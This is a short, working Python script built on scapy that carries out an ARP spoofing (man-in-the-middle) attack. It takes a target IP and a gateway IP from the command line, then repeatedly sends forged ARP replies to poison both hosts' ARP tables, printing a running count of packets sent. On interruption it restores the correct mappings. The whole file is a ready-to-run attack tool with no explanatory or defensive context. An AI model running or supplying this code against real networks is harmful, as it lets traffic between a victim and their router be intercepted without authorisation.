#!/usr/bin/python
import scapy.all as scapy
import argparse
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target",help="Target IP.")
    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP.")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip) #spoof the client
        spoof(gateway_ip, target_ip) #spoof the router
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: "+ str(sent_packet_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\n[+++] Resetting ARP-Table.\n")
    restore(target_ip, gateway_ip)#giving target the correct-router-add
    restore(gateway_ip, target_ip)#giving router the correct-target-add
